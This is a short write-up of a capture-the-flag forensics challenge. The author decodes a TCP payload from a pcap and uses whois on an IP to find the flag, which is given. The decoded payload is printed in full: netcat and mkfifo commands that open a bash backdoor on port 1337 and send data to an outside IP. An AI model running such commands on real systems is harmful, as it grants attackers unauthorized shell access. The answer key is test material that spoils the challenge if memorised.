# Nation State Musical
**Category:** Forensics

**Points:** ???

**Description:**
> **Author:** t0pc4r
>
> **Hint:** "Oh no! It looks like a nation state is trying to attack one
>        of UMDs routers! Using a pcap generated from the attack, try
> 	     to determine which nation state the attack is coming from.
>
>	Beware, you only have five guesses.

> The flag will be in the format UMDCTF-{Country}"

> **Note:** "Do not attempt to communicate with or contact any of
       the IP addresses mentioned in the challenge. The challenge
	   can and should be solved statically."

> **Given:** Pcap file "attack.pcap"

## Writeup
Looking at the pcap file, we can see there are A LOT of TCP packets
from ONE source to ONE destination. I ran a whois on the source IP
address, which showed that the IP was from Ukraine, but that's too easy.

I looked at the pcap file a little more to realize that one of the TCP
packets had data associated to it. I did a quick hex to ascii and the
output was:

```
ÿþ';
rm -f backd00r
mkfifo backd00r
nc -lk 1337 0<backd00r | /bin/bash 1>backd00
echo '<5= :V@5<V=' | nc 37.46.96.0 1337
```

I can see that another IP addressed is being used, so I ran another whois
on this other IP. The IP was from Kazakhstan, so I tried the flag,
UMDCTF-{Kazakhstan} and it worked.

There is probably an explanation to why this IP address is the actual source
of the attacks, but I'm not too sure what it is.

## Flag
UMDCTF-{Kazakhstan}
